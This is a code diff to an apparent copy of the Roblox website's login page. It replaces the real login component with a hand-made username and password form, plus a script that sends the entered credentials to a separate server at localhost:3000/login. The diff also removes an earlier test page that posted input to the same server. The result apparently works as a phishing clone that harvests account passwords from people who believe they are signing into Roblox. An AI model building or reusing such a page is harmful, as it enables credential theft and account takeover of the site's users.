@@ -431,7 +431,17 @@
 
         <div class="content" id="content">
 
-<div id="react-login-web-app"></div>
+<div id="react-login-web-app">
+    <form id="login-form">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" required>
+        <br>
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required>
+        <br>
+        <button type="submit">Log In</button>
+    </form>
+</div>
 
         </div>
     </main><!--Bootstrap Footer React Component -->
@@ -933,43 +943,25 @@ function checkRobloxInstall() {
 
 
     <script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='pageEnd' type='text/javascript' src='https://js.rbxcdn.com/15d0ac733753b4c7d70fa6ecb0d2bb20.js'></script>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Input Storage</title>
-    <style>
-        body { font-family: Arial, sans-serif; }
-        .container { max-width: 600px; margin: auto; padding: 20px; }
-        .input-field { margin-bottom: 10px; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h2>Store Input Data</h2>
-        <div class="input-field">
-            <label for="inputData">Enter Data:</label>
-            <input type="text" id="inputData" />
-        </div>
-        <button onclick="storeData()">Store Data</button>
-    </div>
-    <script>
-        async function storeData() {
-            const inputData = document.getElementById('inputData').value;
-            if (inputData) {
-                const response = await fetch('http://localhost:3000/store-data', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ data: inputData })
-                });
-                alert(await response.text());
-            } else {
-                alert('Please enter some data.');
-            }
-        }
-    </script>
+
+<script>
+    document.getElementById('login-form').addEventListener('submit', function(event) {
+        event.preventDefault();
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        fetch('http://localhost:3000/login', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ username, password })
+        })
+        .then(response => response.json())
+        .then(data => console.log(data))
+        .catch(error => console.error('Error:', error));
+    });
+</script>
+
 </body>
 </html>
